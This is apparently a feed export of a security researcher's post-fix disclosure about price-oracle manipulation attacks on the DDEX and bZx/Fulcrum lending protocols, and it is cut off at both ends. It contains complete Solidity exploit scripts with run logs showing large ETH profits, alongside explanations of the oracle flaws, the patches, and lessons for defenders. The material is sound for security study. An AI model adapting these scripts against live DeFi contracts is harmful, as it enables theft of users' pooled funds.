DAI.balanceOf(address(this)) - start;\n        WETH.withdrawAll();\n    }\n    \n    function steal() external {\n        HydroLike.Market memory ethDaiMarket = HYDRO.getMarket(ETHDAI_MARKET_ID);\n        HydroLike.BalancePath memory commonPath = HydroLike.BalancePath({\n            category: HydroLike.BalanceCategory.Common,\n            marketID: 0,\n            user: address(this)\n        });\n        HydroLike.BalancePath memory ethDaiPath = HydroLike.BalancePath({\n            category: HydroLike.BalanceCategory.CollateralAccount,\n            marketID: 1,\n            user: address(this)\n        });\n        \n        uint ethWanted = HYDRO.getPoolCashableAmount(HYDRO_ETH);\n        uint daiRequired = ETH_ORACLE.getPrice(HYDRO_ETH) * ethWanted * ethDaiMarket.withdrawRate / DAI_ORACLE.getPrice(DAI) / 1 ether + 1 ether;\n        \n        printf(&quot;ethWanted=%.18u daiNeeded=%.18u\\n&quot;, abi.encode(ethWanted, daiRequired));\n        \n        HydroLike.Action[] memory actions = new HydroLike.Action[](5);\n        actions[0] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Deposit,\n            encodedParams: abi.encode(address(DAI), uint(daiRequired))\n        });\n        actions[1] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Transfer,\n            encodedParams: abi.encode(address(DAI), commonPath, ethDaiPath, uint(daiRequired))\n        });\n        actions[2] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Borrow,\n            encodedParams: abi.encode(uint16(ETHDAI_MARKET_ID), address(HYDRO_ETH), uint(ethWanted))\n        });\n        actions[3] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Transfer,\n            encodedParams: abi.encode(address(HYDRO_ETH), ethDaiPath, commonPath, uint(ethWanted))\n        });\n        actions[4] = HydroLike.Action({\n            actionType: HydroLike.ActionType.Withdraw,\n            encodedParams: abi.encode(address(HYDRO_ETH), uint(ethWanted))\n        });\n        DAI.approve(address(HYDRO), daiRequired);\n        HYDRO.batch(actions);\n    }\n    \n    function cleanup() external {\n        DAI.approve(address(MATCHING_MARKET), uint(-1));\n        MATCHING_MARKET.sellAllAmount(DAI, boughtFromMatchingMarket, WETH, uint(0));\n        WETH.withdrawAll();\n        \n        DAI.giveAllToUniswap();\n        require(DAI_ORACLE.updatePrice());\n    }\n    \n    function checkProfits() external {\n        printf(&quot;profits=%.18u\\n&quot;, abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n}\n\n/*\n### running script &quot;ddex-exploit&quot; at block 8572000\n#### executing step: exploit\n##### calling: checkRates()\neth=213.440000000000000000 dai=1.003140638067989051\n##### calling: skewRates()\n##### calling: checkRates()\neth=213.440000000000000000 dai=16.058419875880325580\n##### calling: steal()\nethWanted=122.103009983203364425 daiNeeded=2435.392672403537525078\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=72.140629996890984407\n#### finished executing step: exploit\n*/</code></pre><h3 id=\"solution\">Solution</h3><p>The DDEX team fixed this by deploying a <a href=\"https://etherscan.io/address/0xe6f148448b61339a59ef6ab9ab7378e9200fa745\">new oracle</a> which places sanity bounds on the price of DAI, currently set to <code>0.95</code> and <code>1.05</code>.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">function updatePrice()\n\tpublic\n\treturns (bool)\n{\n\tuint256 _price = peek();\n\n\tif (_price == 0) {\n\t\treturn false;\n\t}\n\n\tif (_price == price) {\n\t\treturn true;\n\t}\n\n\tif (_price &gt; maxPrice) {\n\t\t_price = maxPrice;\n\t} else if (_price &lt; minPrice) {\n\t\t_price = minPrice;\n\t}\n\n\tprice = _price;\n\temit UpdatePrice(price);\n\n\treturn true;\n}</code></pre><figcaption><a href=\"https://github.com/HydroProtocol/protocol/blob/0466e064234117d9c8f7ae6962fe6233427d8656/contracts/oracle/DaiPriceOracle.sol#L100-L124\">Source</a></figcaption></figure><h1 id=\"bzx-and-fulcrum\">bZx and Fulcrum</h1><p><a href=\"https://bzx.network\">bZx</a> is a decentralized margin-trading protocol, while <a href=\"https://fulcrum.trade/#/\">Fulcrum</a> is a project built by the bZx team on top of bZx itself. One feature of Fulcrum is the ability to take a loan on an <em>iToken</em> (read more about that <a href=\"https://medium.com/bzxnetwork/introducing-fulcrum-tokenized-margin-made-dead-simple-e65ccc82393f\">here</a>) using any* other token as collateral. In order to determine how much collateral is needed, bZx uses the <a href=\"https://kyber.network\">Kyber Network</a> as an on-chain decentralized oracle to check the conversion rate between the collateral token and the loan token.<br>* if it&apos;s tradable on Kyber</p><p>However, it&apos;s important to first understand how the Kyber Network functions. Unlike most other DEXes, the Kyber Network derives liquidity from <em>reserves</em> (read more about that <a href=\"https://developer.kyber.network/docs/Reserves-Intro/\">here</a>). When a user wants to make a trade between two tokens A and B, the main Kyber contract will query all registered reserves for the best rate between A/ETH and ETH/B, then perform the trade using the two reserves selected.</p><p>Reserves can be listed automatically through the <em>PermissionlessOrderbookReserveLister</em> contract, which will create a <em>permissionless</em> reserve. Reserves can also be listed by the Kyber team on behalf of a market maker after KYC and legal requirements are met. In this case, the reserve will be a <em>permissioned</em> reserve. When conducting a trade using Kyber, traders have the option of only using permissioned reserves, or using all available reserves.</p><h2 id=\"the-attack-1\">The attack</h2><p>When bZx checks the price of a collateral token, it specifies that only permissioned reserves should be used. This decision was made based on the Kyber whitepaper at the time, with the logic being that permissioned reserves had to undergo review and so the rates should be &quot;correct&quot;.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2019/09/image.png\" class=\"kg-image\" alt loading=\"lazy\"><figcaption><a href=\"https://whitepaper.io/document/43/kyber-network-whitepaper\">Source</a>, Credit: Kyber Network</figcaption></figure><p>This means that if we can somehow increase the rate reported by a permissioned reserve, we can trick Fulcrum into thinking our collateral is worth more than it really is.</p><h3 id=\"a-permissioned-orderbookreserve\">A permissioned OrderbookReserve</h3><p>On June 16 2019, the Kyber team listed an OrderbookReserve for the WAX token as a permissioned reserve in <a href=\"https://etherscan.io/tx/0xce7df57e6b6d5589f19125b9298bbb36e672d373196d7610073540f59220c318\">this transaction</a>. This was interesting because the statement &quot;an OrderbookReserve is always permissioned&quot; was considered to be axiomatic.</p><p>After this reserve was listed, the Kyber Network itself continued to perform according to specifications. However, we can now significantly affect the apparent exchange rate between WAX and ETH simply by listing an order, which means that we can trick any project which relies on Kyber to provide an accurate FMV.</p><h4 id=\"demo-1\">Demo</h4><p>The following script will turn a profit of approximately 1200ETH by:</p><ol><li>Listing an order buying 1 WAX for 10 ETH, increasing the price from 0.00ETH/WAX to 10ETH/WAX</li><li>Borrowing DAI from bZx using WAX as a collateral</li><li>Cancelling all orders and converting all assets to ETH</li></ol><pre><code class=\"language-solidity\">contract BZxWAXExploit is Script, Constants, TokenHelper, BZxHelpers {\n    BZxLoanTokenV2Like private constant BZX_DAI = BZxLoanTokenV2Like(0x14094949152EDDBFcd073717200DA82fEd8dC960);\n    \n    ERC20Like private constant WAX = ERC20Like(0x39Bb259F66E1C59d5ABEF88375979b4D20D98022);\n    OrderbookReserveLike private constant WAX_ORDER_BOOK = OrderbookReserveLike(0x75fF6BeC6Ed398FA80EA1596cef422D64681F057);\n    \n    uint constant private INITIAL_BALANCE = 150 ether;\n    \n    function setup() public {\n        name(&quot;bzx-wax-exploit&quot;);\n        blockNumber(8455720);\n    }\n    \n    function run() public {\n        begin(&quot;exploit&quot;)\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.makeOrder)\n            .then(this.checkRates)\n            .then(this.borrow)\n            .then(this.cleanup)\n            .finally(this.checkProfits);\n    }\n    \n    uint constant rateCheckAmount = 1e8;\n    \n    function checkRates() external {\n        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(WAX, KYBER_ETH, rateCheckAmount);\n        printf(&quot;checking rates tokens=%.8u rate=%.18u slippage=%.18u\\n&quot;, abi.encode(rateCheckAmount, rate, slippage));\n    }\n    \n    uint constant waxBidAmount = 1e8;\n    uint constant ethOfferAmount = 10 ether;\n    uint32 private orderId;\n    function makeOrder() external {\n        orderId = WAX_ORDER_BOOK.ethToTokenList().nextFreeId();\n        \n        uint kncRequired = WAX_ORDER_BOOK.calcKncStake(ethOfferAmount);\n        printf(&quot;making malicious order kncRequired=%.u\\n&quot;, abi.encode(KNC.decimals(), kncRequired));\n        \n        KNC.getFromUniswap(kncRequired);\n        WAX.getFromBancor(1 ether);\n        \n        WAX.approve(address(WAX_ORDER_BOOK), waxBidAmount);\n        KNC.approve(address(WAX_ORDER_BOOK), kncRequired);\n        \n        WAX_ORDER_BOOK.depositEther.value(ethOfferAmount)(address(this));\n        WAX_ORDER_BOOK.depositToken(address(this), waxBidAmount);\n        WAX_ORDER_BOOK.depositKncForFee(address(this), kncRequired);\n        require(WAX_ORDER_BOOK.submitEthToTokenOrder(uint128(ethOfferAmount), uint128(waxBidAmount)));\n    }\n    \n    function borrow() external {\n        bytes32 hash = doBorrow(BZX_DAI, false, BZX_DAI.marketLiquidity(), DAI, WAX);\n        printf(&quot;borrowing loanHash=%32x\\n&quot;, abi.encode(hash));\n    }\n    \n    function cleanup() external {\n        require(WAX_ORDER_BOOK.cancelEthToTokenOrder(orderId));\n        WAX_ORDER_BOOK.withdrawEther(WAX_ORDER_BOOK.makerFunds(address(this), KYBER_ETH));\n        WAX_ORDER_BOOK.withdrawToken(WAX_ORDER_BOOK.makerFunds(address(this), WAX));\n        WAX_ORDER_BOOK.withdrawKncFee(WAX_ORDER_BOOK.makerKnc(address(this)));\n        DAI.giveAllToUniswap();\n        KNC.giveAllToUniswap();\n        WAX.giveAllToBancor();\n        WETH.withdrawAll();\n    }\n    \n    function checkProfits() external {\n        printf(&quot;profits=%.18u\\n&quot;, abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n    \n    function borrowInterest(uint amount) internal {\n        DAI.getFromUniswap(amount);\n    }\n}\n\n/*\n### running script &quot;bzx-wax-exploit&quot; at block 8455720\n#### executing step: exploit\n##### calling: checkRates()\nchecking rates tokens=1.00000000 rate=0.000000000000000000 slippage=0.000000000000000000\n##### calling: makeOrder()\nmaking malicious order kncRequired=127.438017578344399080\n##### calling: checkRates()\nchecking rates tokens=1.00000000 rate=10.000000000000000000 slippage=9.700000000000000000\n##### calling: borrow()\ncollateral_required=232.02826470, interest_required=19750.481385867262370788\nborrowing loanHash=0x2cca5c037a25b47338027b9d1bed55d6bc131b3d1096925538f611240d143c64\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=1170.851523093083307797\n#### finished executing step: exploit\n*/</code></pre><h4 id=\"solution-1\">Solution</h4><p>The bZx team blocked this attack by whitelisting tokens which can be used as collateral.</p><h3 id=\"eth2dai\">Eth2Dai</h3><p>Now that there&apos;s a whitelist on the tokens that can be used as collateral, we&apos;ll need to through all the permissioned reserves to see if there&apos;s anything else that we can abuse. It turns out that DAI, one of the whitelisted tokens, has a permissioned reserve which integrates with Eth2Dai. As Eth2Dai allows users to create limit orders, this is essentially the previous attack but with more steps.</p><p>Interestingly, we first observe that although the Eth2Dai contract is titled <code>MatchingMarket</code>, it&apos;s not strictly true that all new orders will be automatically matched. This is because while the functions <code>offer(uint,ERC20,uint,ERC20,uint)</code> and <code>offer(uint,ERC20,uint,ERC20,uint,bool)</code> will trigger the matching logic, the function <code>offer(uint,ERC20,uint,ERC20)</code> does not.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-solidity\">// Make a new offer. Takes funds from the caller into market escrow.\nfunction offer(\n\tuint pay_amt,    //maker (ask) sell how much\n\tERC20 pay_gem,   //maker (ask) sell which token\n\tuint buy_amt,    //maker (ask) buy how much\n\tERC20 buy_gem,   //maker (ask) buy which token\n\tuint pos         //position to insert offer, 0 should be used if unknown\n)\n\tpublic\n\tcan_offer\n\treturns (uint)\n{\n\treturn offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);\n}\n\nfunction offer(\n\tuint pay_amt,    //maker (ask) sell how much\n\tERC20 pay_gem,   //maker (ask) sell which token\n\tuint buy_amt,    //maker (ask) buy how much\n\tERC20 buy_gem,   //maker (ask) buy which token\n\tuint pos,        //position to insert offer, 0 should be used if unknown\n\tbool rounding    //match &quot;close enough&quot; orders?\n)\n\tpublic\n\tcan_offer\n\treturns (uint)\n{\n\trequire(!locked, &quot;Reentrancy attempt&quot;);\n\trequire(_dust[pay_gem] &lt;= pay_amt);\n\n\tif (matchingEnabled) {\n\t  return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, rounding);\n\t}\n\treturn super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n}</code></pre><figcaption><a href=\"https://github.com/makerdao/maker-otc/blob/d1c5e3f52258295252fabc78652a1a55ded28bc6/src/matching_market.sol#L113-L147\">Source</a></figcaption></figure><p>Furthermore, we observe that even though the comments seem to suggest that only authorized users can call <code>offer(uint,ERC20,uint,ERC20)</code>, there&apos;s no authorization logic at all.</p><pre><code class=\"language-solidity\">// Make a new offer. Takes funds from the caller into market escrow.\n//\n// If matching is enabled:\n//     * creates new offer without putting it in\n//       the sorted list.\n//     * available to authorized contracts only!\n//     * keepers should call insert(id,pos)\n//       to put offer in the sorted list.\n//\n// If matching is disabled:\n//     * calls expiring market&apos;s offer().\n//     * available to everyone without authorization.\n//     * no sorting is done.\n//\nfunction offer(\n\tuint pay_amt,    //maker (ask) sell how much\n\tERC20 pay_gem,   //maker (ask) sell which token\n\tuint buy_amt,    //taker (ask) buy how much\n\tERC20 buy_gem    //taker (ask) buy which token\n)\n\tpublic\n\treturns (uint)\n{\n\trequire(!locked, &quot;Reentrancy attempt&quot;);\n\tvar fn = matchingEnabled ? _offeru : super.offer;\n\treturn fn(pay_amt, pay_gem, buy_amt, buy_gem);\n}</code></pre><p>While in practice lack of authorization is irrelevant as arbitrage bots will quickly fill any orders that can be automatically matched, in an atomic transaction we can create and cancel arbitrage-able orders and no bots will be able to fill them.</p><p>All that&apos;s left is to slightly modify our script from the previous attack to place orders on Eth2Dai instead of the OrderbookReserve. Note that in this case we will need to call both <code>order(uint,ERC20,uint,ERC20)</code> to submit the order to Eth2Dai without it being atomically matched, and then <code>insert(uint,uint)</code> in order to manually sort the order without triggering matching.</p><h4 id=\"demo-2\">Demo</h4><p>The following script will turn a profit of approximately 2500ETH by:</p><ol><li>Listing an order buying 1 DAI for 10 ETH, increasing the price from 0.006ETH/DAI to 9.98ETH/DAI.</li><li>Borrowing ETH from bZx using DAI as collateral</li><li>Cancelling all orders and converting all assets to ETH</li></ol><pre><code class=\"language-solidity\">contract BZxOasisExploit is Script, Constants, TokenHelper, BZxHelpers {\n    BZxLoanTokenV2Like private constant BZX_ETH = BZxLoanTokenV2Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);\n    \n    uint constant private INITIAL_BALANCE = 250 ether;\n    \n    function setup() public {\n        name(&quot;bzx-oasis-exploit&quot;);\n        blockNumber(8455720);\n    }\n    \n    function run() public {\n        begin(&quot;exploit&quot;)\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.makeOrder)\n            .then(this.checkRates)\n            .then(this.borrow)\n            .then(this.cleanup)\n            .finally(this.checkProfits);\n    }\n    \n    uint constant rateCheckAmount = 1 ether;\n    \n    function checkRates() external {\n        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(DAI, KYBER_ETH, rateCheckAmount);\n        printf(&quot;checking rates tokens=%.18u rate=%.18u slippage=%.18u\\n&quot;, abi.encode(rateCheckAmount, rate, slippage));\n    }\n    \n    uint private id;\n    \n    uint constant daiBidAmount = 1 ether;\n    uint constant ethOfferAmount = 10 ether;\n    function makeOrder() external {\n        WETH.deposit.value(ethOfferAmount)();\n        WETH.approve(address(MATCHING_MARKET), ethOfferAmount);\n        id = MATCHING_MARKET.offer(ethOfferAmount, WETH, daiBidAmount, DAI);\n        printf(&quot;made order id=%u\\n&quot;, abi.encode(id));\n        \n        require(MATCHING_MARKET.insert(id, 0));\n    }\n    \n    function borrow() external {\n        bytes32 hash = doBorrow(BZX_ETH, false, BZX_ETH.marketLiquidity(), WETH, DAI);\n        printf(&quot;borrowing loanHash=%32x\\n&quot;, abi.encode(hash));\n    }\n    \n    function cleanup() external {\n        require(MATCHING_MARKET.cancel(id));\n        DAI.giveAllToUniswap();\n        WETH.withdrawAll();\n    }\n    \n    function checkProfits() external {\n        printf(&quot;profits=%.18u\\n&quot;, abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n    \n    function borrowInterest(uint amount) internal {\n        WETH.deposit.value(amount)();\n    }\n    \n    function borrowCollateral(uint amount) internal {\n        DAI.getFromUniswap(amount);\n    }\n}\n\n/*\n### running script &quot;bzx-oasis-exploit&quot; at block 8455720\n#### executing step: exploit\n##### calling: checkRates()\nchecking rates tokens=1.000000000000000000 rate=0.005950387240736517 slippage=0.005771875623514421\n##### calling: makeOrder()\nmade order id=414191\n##### calling: checkRates()\nchecking rates tokens=1.000000000000000000 rate=9.975000000000000000 slippage=9.675750000000000000\n##### calling: borrow()\ncollateral_required=398.831304885561111810, interest_required=203.458599916962956188\nborrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=2446.376892708285686012\n#### finished executing step: exploit\n*/</code></pre><h4 id=\"solution-2\">Solution</h4><p>The bZx team blocked this attack by modifying the oracle logic such that if the collateral and loan token were both either DAI or WETH, then the exchange rate would be loaded directly from Maker&apos;s oracles.</p><p>However, this solution was incomplete because of the way Kyber resolves the best rate. If you&apos;ll recall, Kyber determines the best rate for A/B by determining the best rate for A/ETH and ETH/B, then calculating the amount of B that could be bought with the ETH received by trading A.</p><p>This meant that if we were to attempt to borrow a non-ETH token such as USDC using DAI as collateral, Kyber would first determine the best exchange rate for DAI/ETH, then the best rate for ETH/USDC, and finally the best rate for DAI/USDC. Because we can artificially increase the exchange rate for DAI/ETH, we can still manipulate the exchange rate for DAI/USDC even though we don&apos;t control a permissioned USDC reserve.</p><p>The bZx team blocked this attack in two ways:</p><ol><li>If either the loan token or collateral token wasn&apos;t ETH, then bZx would manually determine the exchange rate between the token and ETH, unless</li><li>The loan token or collateral token was a USD-based stablecoin, in which case bZx would use the rate from Maker&apos;s oracle</li></ol><h3 id=\"uniswap\">Uniswap</h3><p>An astute reader may notice at this point that bZx&apos;s solution still does not handle incorrect FMVs for arbitrary tokens. This means that if we can find another permissioned reserve which can be manipulated, we can take out yet another undercollateralized loan.</p><p>After sifting through all the registered permissioned reserves for the whitelisted tokens, we notice that the REP token has a reserve which integrates with Uniswap. We already know from our attacks on DDEX that Uniswap&apos;s prices can be manipulated, so we can re-purpose our previous attack and substitute Eth2Dai and DAI for Uniswap and REP.</p><h4 id=\"demo-3\">Demo</h4><p>The following script will turn a profit of approximately 2500ETH by:</p><ol><li>Performing a large order buy on Uniswap&apos;s REP exchange, increasing the price from 0.05ETH/REP to 6.05ETH/REP</li><li>Borrowing ETH from bZx using REP as collateral</li><li>Cancelling all orders and convert all assets to ETH</li></ol><pre><code class=\"language-solidity\">contract BZxUniswapExploit is Script, Constants, TokenHelper, BZxHelpers {\n    BZxLoanTokenV3Like private constant BZX_ETH = BZxLoanTokenV3Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);\n    \n    uint constant private INITIAL_BALANCE = 5000 ether;\n    \n    function setup() public {\n        name(&quot;bzx-uniswap-exploit&quot;);\n        blockNumber(8547500);\n    }\n    \n    function run() public {\n        begin(&quot;exploit&quot;)\n            .withBalance(INITIAL_BALANCE)\n            .first(this.checkRates)\n            .then(this.makeOrder)\n            .then(this.checkRates)\n            .then(this.borrow)\n            .then(this.cleanup)\n            .finally(this.checkProfits);\n    }\n    \n    uint constant rateCheckAmount = 10 ether;\n    \n    function checkRates() external {\n        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(REP, KYBER_ETH, rateCheckAmount);\n        printf(&quot;checking rates tokens=%.18u rate=%.18u slippage=%.18u\\n&quot;, abi.encode(rateCheckAmount, rate, slippage));\n    }\n    \n    function makeOrder() external {\n        UniswapLike uniswap = REP.getUniswapExchange();\n        uint totalSupply = REP.balanceOf(address(uniswap));\n        uint borrowAmount = totalSupply * 90 / 100;\n        REP.getFromUniswap(borrowAmount);\n        printf(&quot;making order totalSupply=%.18u borrowed=%.18u\\n&quot;, abi.encode(totalSupply, borrowAmount));\n    }\n    \n    function borrow() external {\n        bytes32 hash = doBorrow(BZX_ETH, true, BZX_ETH.marketLiquidity(), WETH, REP);\n        printf(&quot;borrowing loanHash=%32x\\n&quot;, abi.encode(hash));\n    }\n    \n    function cleanup() external {\n        REP.giveAllToUniswap();\n        WETH.withdrawAll();\n    }\n    \n    function checkProfits() external {\n        printf(&quot;profits=%.18u\\n&quot;, abi.encode(address(this).balance - INITIAL_BALANCE));\n    }\n    \n    function borrowInterest(uint amount) internal {\n        WETH.deposit.value(amount)();\n    }\n}\n\n/*\n### running script &quot;bzx-uniswap-exploit&quot; at block 8547500\n#### executing step: exploit\n##### calling: checkRates()\nchecking rates tokens=10.000000000000000000 rate=0.057621091203633720 slippage=0.055892458467524708\n##### calling: makeOrder()\nmaking order totalSupply=8856.102959786215028808 borrowed=7970.492663807593525927\n##### calling: checkRates()\nchecking rates tokens=10.000000000000000000 rate=5.656379870360426078 slippage=5.486688474249613295\n##### calling: borrow()\ncollateral_required=702.265284613341236862, interest_required=205.433213643594588344\nborrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c\n##### calling: cleanup()\n##### calling: checkProfits()\nprofits=2425.711777227580307468\n#### finished executing step: exploit\n*/</code></pre><h4 id=\"solution-3\">Solution</h4><p>The bZx team reverted their changes for the previous attack and instead implemented a spread check, such that if the spread was above a certain threshold then the loan would be rejected. This solution handles the generic case so long as both tokens being queried has at least one non-manipulable reserve on Kyber, which is currently the case for all whitelisted tokens.</p><h1 id=\"key-takeaways\">Key Takeaways</h1><h2 id=\"don-t-use-an-on-chain-decentralized-oracle-without-some-sort-of-validation\">Don&apos;t use an on-chain decentralized oracle without some sort of validation</h2><p>Due to the nature of on-chain decentralized oracles, ensure that you&apos;re validating the rate being returned, whether it&apos;s by taking the order (thereby nullifying any gains which may have been realized), comparing the rate against known good rates (in the case of DAI), or comparing the rate in both directions.</p><h2 id=\"consider-the-implications-of-dependencies-on-third-party-projects\">Consider the implications of dependencies on third-party projects</h2><p>In both cases, DDEX and bZx assumed that Uniswap and Kyber would be a source of accurate price data. However, an accurate rate for a DEX means that a trade can be made using that rate, while an accurate rate for a DeFi project means that it is close to or equal to the FMV. In other words, an accurate rate for a DeFi project is an accurate rate for a DEX, but the opposite might not be true.</p><p>Furthermore, bZx&apos;s second attempt at solving this problem was insufficient due to a misunderstanding in how the Kyber Network internally calculates the exchange rate between two non-ETH tokens.</p><p>As such, before introducing a dependency on a third-party project, consider not only whether the project has been audited, but also whether the project&apos;s specifications and threat model align with your own. If you have the time, taking an in-depth look at their contracts also doesn&apos;t hurt.</p><h1 id=\"further-reading\">Further Reading</h1><ul><li><a href=\"https://medium.com/@b0xNet/your-funds-are-safe-d35826fe9a87\">bZx&apos;s disclosure</a></li><li><a href=\"https://medium.com/ddex/fixed-potential-vulnerability-in-contract-used-during-private-beta-217c0ed6f694\">DDEX&apos;s disclosure</a></li><li><a href=\"https://gist.github.com/samczsun/c20119b80f6f7f0a8e197666e0a2b1c9\">The libraries that the scripts used</a></li></ul>","content:encodedSnippet":"tl;dr\nBy relying on an on-chain decentralized price oracle without validating the rates returned, DDEX and bZx were susceptible to atomic price manipulation. This would have resulted in the loss of liquid ETH in the ETH/DAI market for DDEX, and loss of all liquid funds in bZx. Fortunately, no funds were actually lost.\nWhat is decentralized lending?\nFirst, let's talk about traditional lending. When you take out a loan, you typically need to provide some sort of collateral so that if you default on your loan, the lender can then seize the collateral. In order to determine how much collateral you need to supply, the lender typically knows or can reliably calculate the fair market value (FMV) of the collateral.\nIn decentralized lending, the same process occurs except now the lender is a smart contract that is isolated from the outside world. This means that it can't simply \"know\" the FMV of whatever collateral you're trying to provide.\nTo solve this problem, developers instruct the smart contract to query an oracle, which accepts the address of a token and returns the current price of that token in a desired currency (for example, ETH or USD). Different DeFi projects have taken different approaches to implementing this oracle, but they can generally all be classified in one of five ways (although some implementations blur the lines more than others):\n\nOff-chain Centralized Oracle\nThis type of oracle simply accepts new prices from an off-chain source, typically an account controlled by the project. Due to the need to quickly update the oracle with new exchange rates, the account is typically an EOA and not a multisig. There may be some sanity checking to ensure that prices don't fluctuate too wildly. Compound Finance and Synthetix mainly use this type of oracle for most assets\nOff-chain Decentralized Oracle\nThis type of oracle accepts new prices from multiple off-chain sources and merges the values through a mathematical function, such as an average. In this model, a multisig wallet is typically used to manage the list of authorized sources. Maker uses this type of oracle for ETH and other assets\nOn-chain Centralized Oracle\nThis type of oracle determines the price of assets using an on-chain source, such as a DEX. However, only a central authority can trigger the oracle to read from the on-chain source. Like an off-chain centralized oracle, this type of oracle requires rapid updates and as such the triggering account is likely an EOA and not a multisig. dYdX and Nuo use this type of oracle for certain assets\nOn-chain Decentralized Oracle\nThis type of oracle determines the price of assets using an on-chain source, but can be updated by anyone. There may be some sanity checking to ensure that prices don't fluctuate too wildly. DDEX uses this type oracle for DAI, while bZx uses this type of oracle for all assets\nConstant Oracle\nThis type of oracle simply returns a constant value, and is typically used for stablecoins. Nearly all projects mentioned above use this type of oracle for USDC due to its guaranteed peg\n\nThe problem\nWhile searching for additional vulnerable projects, I came across this tweet.\n\nI'm honestly worried they're using it as a price feed. If my hunch is right that's so attackable....\n— Vitalik Non-giver of Ether (@VitalikButerin) February 20, 2019\n\n\nSomeone asked for clarification, and the Uniswap project responded with the following.\n\nBecause it is possible to make a huge trade, use a function that checks the price oracle, then execute another huge trade synchronously using smart contracts. This means the attacker only loses fees and can’t get arbed. \nWorking on improving Uniswap as an oracle in the future.\n— Uniswap 🦄 (@UniswapExchange) February 20, 2019\n\n\nThese tweets explain the problem very clearly, but it's important to note that this problem exists for any oracle which can provide the FMV on-chain, not just Uniswap.\nIn general, if a price oracle is completely decentralized, then an attacker can manipulate the apparent price at a specific instant with minimal to no loss in slippage fees. If an attacker can then convince a DeFi dApp to check the oracle at the instant when the apparent price has been manipulated, then they can cause significant harm to the system. In the case of DDEX and bZx, it was possible to take out a loan that appeared to be sufficiently collateralized, but was in fact undercollateralized. \nDDEX (Hydro Protocol)\nDDEX is a decentralized exchange platform but are in the process of expanding into decentralized lending so that they can offer their users the ability to create leveraged long and short positions. They're currently beta testing their decentralized margin exchange.\nOn September 9th 2019, DDEX added DAI as an asset to their margin trading platform and enabled the ETH/DAI market. For the oracle, they specified this smart contract which returns the value of DAI/USD by calculating PriceOfETHInUSD/PriceOfETHInDAI. The value of ETH/USD is read from the Maker oracle, while the value of ETH/DAI is read from either Eth2Dai, or if the spread is too great, Uniswap.\n\nfunction peek()\n\tpublic\n\tview\n\treturns (uint256 _price)\n{\n\tuint256 makerDaoPrice = getMakerDaoPrice();\n\n\tif (makerDaoPrice == 0) {\n\t\treturn _price;\n\t}\n\n\tuint256 eth2daiPrice = getEth2DaiPrice();\n\n\tif (eth2daiPrice > 0) {\n\t\t_price = makerDaoPrice.mul(ONE).div(eth2daiPrice);\n\t\treturn _price;\n\t}\n\n\tuint256 uniswapPrice = getUniswapPrice();\n\n\tif (uniswapPrice > 0) {\n\t\t_price = makerDaoPrice.mul(ONE).div(uniswapPrice);\n\t\treturn _price;\n\t}\n\n\treturn _price;\n}\n\nfunction getEth2DaiPrice()\n\tpublic\n\tview\n\treturns (uint256)\n{\n\tif (Eth2Dai.isClosed() || !Eth2Dai.buyEnabled() || !Eth2Dai.matchingEnabled()) {\n\t\treturn 0;\n\t}\n\n\tuint256 bidDai = Eth2Dai.getBuyAmount(address(DAI), WETH, eth2daiETHAmount);\n\tuint256 askDai = Eth2Dai.getPayAmount(address(DAI), WETH, eth2daiETHAmount);\n\n\tuint256 bidPrice = bidDai.mul(ONE).div(eth2daiETHAmount);\n\tuint256 askPrice = askDai.mul(ONE).div(eth2daiETHAmount);\n\n\tuint256 spread = askPrice.mul(ONE).div(bidPrice).sub(ONE);\n\n\tif (spread > eth2daiMaxSpread) {\n\t\treturn 0;\n\t} else {\n\t\treturn bidPrice.add(askPrice).div(2);\n\t}\n}\n\nfunction getUniswapPrice()\n\tpublic\n\tview\n\treturns (uint256)\n{\n\tuint256 ethAmount = UNISWAP.balance;\n\tuint256 daiAmount = DAI.balanceOf(UNISWAP);\n\tuint256 uniswapPrice = daiAmount.mul(10**18).div(ethAmount);\n\n\tif (ethAmount < uniswapMinETHAmount) {\n\t\treturn 0;\n\t} else {\n\t\treturn uniswapPrice;\n\t}\n}\n\nfunction getMakerDaoPrice()\n\tpublic\n\tview\n\treturns (uint256)\n{\n\t(bytes32 value, bool has) = makerDaoOracle.peek();\n\n\tif (has) {\n\t\treturn uint256(value);\n\t} else {\n\t\treturn 0;\n\t}\n}\nSource\nIn order to trigger an update and cause the oracle to refresh its stored value, a user simply has to call updatePrice().\n\nfunction updatePrice()\n\tpublic\n\treturns (bool)\n{\n\tuint256 _price = peek();\n\n\tif (_price != 0) {\n\t\tprice = _price;\n\t\temit UpdatePrice(price);\n\t\treturn true;\n\t} else {\n\t\treturn false;\n\t}\n}\nSource\nThe attack\nLet's assume we can manipulate the apparent value of DAI/USD. If this is the case, we would like to use this to borrow all of the ETH in the system while providing as little DAI as possible. To achieve this, we can either lower the apparent value of ETH/USD or increase the apparent value of DAI/USD. Since we're already assuming that the apparent value of DAI/USD is manipulable, we'll choose the latter.\nTo increase the apparent value DAI/USD, we can either increase the apparent value of ETH/USD, or decrease the apparent value of ETH/DAI. For all intents and purposes manipulating Maker's oracle is impossible, so we'll try decreasing the apparent value of 